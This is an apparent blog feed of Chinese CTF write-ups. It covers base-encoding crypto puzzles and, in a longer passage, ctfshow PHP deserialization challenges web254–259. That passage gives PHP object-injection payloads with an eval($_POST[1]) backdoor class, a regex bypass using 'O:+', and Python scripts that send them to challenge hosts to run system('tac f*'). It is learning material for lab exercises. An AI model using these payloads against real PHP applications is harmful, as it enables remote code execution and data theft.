<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re,base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag_encode.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fin:</span><br><span class="line">    data = fin.read()</span><br><span class="line"></span><br><span class="line">b16_dict = <span class="string">r&quot;^[A-F0-9=]*$&quot;</span></span><br><span class="line">b32_dict = <span class="string">r&quot;^[A-Z2-7=]*$&quot;</span></span><br><span class="line">b64_dict = <span class="string">r&quot;^[A-Za-z0-9/+=]*$&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    t = data.decode()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">in</span> t:</span><br><span class="line">        <span class="built_in">print</span>(t)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> re.match(b16_dict,t):</span><br><span class="line">        data = base64.b16decode(t)</span><br><span class="line">    <span class="keyword">elif</span> re.match(b32_dict,t):</span><br><span class="line">        data = base64.b32decode(t)</span><br><span class="line">    <span class="keyword">elif</span> re.match(b64_dict,t):</span><br><span class="line">        data = base64.b64decode(t)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;寄&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h4 id="BJDCTF-2020-base-（base64编码原理）"><a href="#BJDCTF-2020-base-（base64编码原理）" class="headerlink" title="[BJDCTF 2020]base??（base64编码原理）"></a>[BJDCTF 2020]base??（base64编码原理）</h4><p>这道题给了一个字典，如果了解<code>base64</code>的编码原则，大概可以猜到，这段密文是基于这个字典，按照<code>base64</code>的原则编码的。</p>
<p>附上我的python 脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re,base64</span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="number">0</span>: <span class="string">&#x27;J&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;K&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;L&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;M&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;N&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line">        <span class="number">6</span>: <span class="string">&#x27;x&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;y&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;U&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;V&#x27;</span>, <span class="number">10</span>: <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">        <span class="number">11</span>: <span class="string">&#x27;A&#x27;</span>, <span class="number">12</span>: <span class="string">&#x27;B&#x27;</span>, <span class="number">13</span>: <span class="string">&#x27;C&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;D&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;E&#x27;</span>, </span><br><span class="line">        <span class="number">16</span>: <span class="string">&#x27;F&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;G&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;H&#x27;</span>, <span class="number">19</span>: <span class="string">&#x27;7&#x27;</span>, <span class="number">20</span>: <span class="string">&#x27;8&#x27;</span>, </span><br><span class="line">        <span class="number">21</span>: <span class="string">&#x27;9&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;P&#x27;</span>, <span class="number">23</span>: <span class="string">&#x27;Q&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;I&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;a&#x27;</span>, </span><br><span class="line">        <span class="number">26</span>: <span class="string">&#x27;b&#x27;</span>, <span class="number">27</span>: <span class="string">&#x27;c&#x27;</span>, <span class="number">28</span>: <span class="string">&#x27;d&#x27;</span>, <span class="number">29</span>: <span class="string">&#x27;e&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;f&#x27;</span>, </span><br><span class="line">        <span class="number">31</span>: <span class="string">&#x27;g&#x27;</span>, <span class="number">32</span>: <span class="string">&#x27;h&#x27;</span>, <span class="number">33</span>: <span class="string">&#x27;i&#x27;</span>, <span class="number">34</span>: <span class="string">&#x27;j&#x27;</span>, <span class="number">35</span>: <span class="string">&#x27;k&#x27;</span>, </span><br><span class="line">        <span class="number">36</span>: <span class="string">&#x27;l&#x27;</span>, <span class="number">37</span>: <span class="string">&#x27;m&#x27;</span>, <span class="number">38</span>: <span class="string">&#x27;W&#x27;</span>, <span class="number">39</span>: <span class="string">&#x27;X&#x27;</span>, <span class="number">40</span>: <span class="string">&#x27;Y&#x27;</span>, </span><br><span class="line">        <span class="number">41</span>: <span class="string">&#x27;Z&#x27;</span>, <span class="number">42</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">43</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;2&#x27;</span>, <span class="number">45</span>: <span class="string">&#x27;3&#x27;</span>, </span><br><span class="line">        <span class="number">46</span>: <span class="string">&#x27;4&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;5&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;6&#x27;</span>, <span class="number">49</span>: <span class="string">&#x27;R&#x27;</span>, <span class="number">50</span>: <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">        <span class="number">51</span>: <span class="string">&#x27;T&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;n&#x27;</span>, <span class="number">53</span>: <span class="string">&#x27;o&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;p&#x27;</span>, <span class="number">55</span>: <span class="string">&#x27;q&#x27;</span>, </span><br><span class="line">        <span class="number">56</span>: <span class="string">&#x27;r&#x27;</span>, <span class="number">57</span>: <span class="string">&#x27;s&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;t&#x27;</span>, <span class="number">59</span>: <span class="string">&#x27;u&#x27;</span>, <span class="number">60</span>: <span class="string">&#x27;v&#x27;</span>, </span><br><span class="line">        <span class="number">61</span>: <span class="string">&#x27;w&#x27;</span>, <span class="number">62</span>: <span class="string">&#x27;+&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;/&#x27;</span>, <span class="number">64</span>: <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">inv_dict = &#123;v : k <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">dict</span>.items()&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_bit_stream</span>(<span class="params">c</span>):</span></span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">        one = <span class="built_in">bin</span>(inv_dict[i]).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        one = (<span class="number">6</span>-<span class="built_in">len</span>(one))*<span class="string">&#x27;0&#x27;</span> + one</span><br><span class="line">        res += one</span><br><span class="line">    <span class="keyword">return</span> res    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_ascii_stream</span>(<span class="params">s</span>):</span></span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">8</span>):</span><br><span class="line">        num = <span class="built_in">int</span>(s[i:i+<span class="number">8</span>],<span class="number">2</span>)</span><br><span class="line">        res += <span class="built_in">chr</span>(num)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cipher = <span class="string">&quot;FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(to_ascii_stream(to_bit_stream(cipher)))</span><br></pre></td></tr></table></figure>
<h4 id="安洵杯-2019-JustBase"><a href="#安洵杯-2019-JustBase" class="headerlink" title="[安洵杯 2019]JustBase"></a>[安洵杯 2019]JustBase</h4><p>这道题其实猜到用键盘上的<code>!@#$%^&amp;*()</code>来替代<code>123456789</code></p>
<p>但是顺序没说，如果直接尝试爆破的话，结果会$10!$种，而且由于<code>base64</code>的容错率比较高，其实最后爆破出来还是要在文本中进一步的筛选（你可以根据部分结果猜出前面那段英文的正确形式，然后全局查找）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_string</span>(<span class="params">l</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(l) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> [l]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">            tmp = get_string(l.replace(i,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp)):</span><br><span class="line">                tmp[j] = i + tmp[j]</span><br><span class="line">            res += tmp</span><br><span class="line">        <span class="comment"># print(res)        </span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_answer</span>(<span class="params"><span class="built_in">dict</span></span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;base.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> fin:</span><br><span class="line">        data = fin.read()</span><br><span class="line">    </span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">            tmp += <span class="built_in">str</span>(<span class="built_in">dict</span>.index(i))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp += i</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = base64.b64decode(tmp.encode()).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">l = <span class="string">&quot;@#!)$(%^*&amp;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = (get_string(l))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">    get_answer(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(len(get_string(l)))</span></span><br></pre></td></tr></table></figure>
<p>补充：网上的<code>WP</code>都说可以观察，其实也是正确的，因为你稍微爆破一下会发现这是一段英文，根据<code>base64</code>明文和密文的长度对比（$3\times8 = 4\times6$），你可以截断部分获取你想要的字符而不影响解码，这样可以大大减少爆破的规模。</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>crypto</category>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>wp</tag>
        <tag>NSS</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>xctf-web进阶-wp</title>
    <url>/2022/04/20/blog0016-xctf-web%E8%BF%9B%E9%98%B6-wp/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>ctfshow-反序列化-wp</title>
    <url>/2022/04/13/blog0014-ctfshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/</url>
    <content><![CDATA[<h2 id="一、写在前面"><a href="#一、写在前面" class="headerlink" title="一、写在前面"></a>一、写在前面</h2><p>反序列化开始，这次题有点多，我先把基础知识做了吧，框架审计那一块可能等暑假认真搞一下web开发再说吧。</p>
<p>魔术方法总结：</p>
<p><a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8B%E5%B8%B8%E8%A7%81%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/#PHP%E5%B8%B8%E8%A7%81%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95">https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8B%E5%B8%B8%E8%A7%81%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/#PHP%E5%B8%B8%E8%A7%81%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</a></p>
<span id="more"></span>
<p>参考链接：</p>
<p><a href="https://tari.moe/2021/04/06/ctfshow-unserialize/">https://tari.moe/2021/04/06/ctfshow-unserialize/</a></p>
<h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><p>一个铺垫，和反序列化关系不大，只是一个简单的校验</p>
<h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><p>做了一个校验，在Cookie中传入数据，反序列化验证。代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$var</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$var</span>)).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><p>这次新增了一个代码逻辑的过滤，没什么意义。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$var</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$var</span>)).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>附一个Python脚本，刷题的时候一直抓包还是烦的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote，urlencode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://af5613f8-a7e0-4b48-8956-7f4e60881c08.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">query = <span class="string">&quot;?username=123456&amp;password=654321&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">r&quot;O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22123456%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22654321%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D&quot;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;user&quot;</span>:payload</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(url=url + query,cookies=cookies,proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
<h3 id="web257（简单pop链）"><a href="#web257（简单pop链）" class="headerlink" title="web257（简单pop链）"></a>web257（简单pop链）</h3><p>有点<code>pop</code>的味道，但是还是很简单。</p>
<p>不过主要就是一点，我们在做反序列化时，对于私有属性的变量，可能存在不可见字符，所以最好还是<code>url</code>或者<code>base</code>编码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span> = <span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$var</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$var</span>));</span><br></pre></td></tr></table></figure>
<p>附上Python脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c3b6867d-d297-4a8e-8b01-2eb5c16a7d3a.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">query = <span class="string">&quot;?username=xxxxxx&amp;password=xxxxxx&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">r&quot;O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7D%7D&quot;</span></span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;user&quot;</span>:payload</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>:<span class="string">&quot;system(&#x27;tac f*&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url + query,cookies=cookies,data=data,proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
<h3 id="web258（反序列化绕过正则）"><a href="#web258（反序列化绕过正则）" class="headerlink" title="web258（反序列化绕过正则）"></a>web258（反序列化绕过正则）</h3><p>这道题有点怪，要反序列化，但是却ban对象类型。</p>
<p>这里涉及的一个点，就是低版本的PHP（如5.6）可能会在属性的数量值上支持正号。</p>
<p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>= <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;come back!\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$var</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"></span><br><span class="line"><span class="variable">$wish</span> = serialize(<span class="variable">$var</span>);</span><br><span class="line">preg_match_all(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>,<span class="variable">$wish</span>,<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">2</span>; <span class="variable">$i</span>+=<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$split</span> = explode(<span class="string">&#x27;:&#x27;</span>,<span class="variable">$dir</span>[<span class="number">0</span>][<span class="variable">$i</span>]);</span><br><span class="line">    <span class="variable">$wish</span> = preg_replace(<span class="string">&#x27;/[oc]:&#x27;</span>.<span class="variable">$split</span>[<span class="number">1</span>].<span class="string">&#x27;:/i&#x27;</span>,<span class="string">&quot;O:+&quot;</span>.<span class="variable">$split</span>[<span class="number">1</span>].<span class="string">&quot;:&quot;</span>,<span class="variable">$wish</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$wish</span>).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>Python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote,urlencode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://af26f1b2-7cd9-49c3-919d-480539e83a9a.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">query = <span class="string">&quot;?username=xxxxxx&amp;password=xxxxxx&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">r&quot;O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7D%7D&quot;</span></span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;user&quot;</span>:payload</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>:<span class="string">&quot;system(&#x27;tac f*&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url + query,cookies=cookies,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
<h3 id="web259（PHP原生类构造SSRF）"><a href="#web259（PHP原生类构造SSRF）" class="headerlink" title="web259（PHP原生类构造SSRF）"></a>web259（PHP原生类构造SSRF）</h3><p>这道题非常有意思，咋一看<code>index.php</code>不大理解到底在干什么。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$vip</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span>-&gt;getFlag();</span><br></pre></td></tr></table></figure>
<p>也给了<code>flag.php</code>的源代码</p>
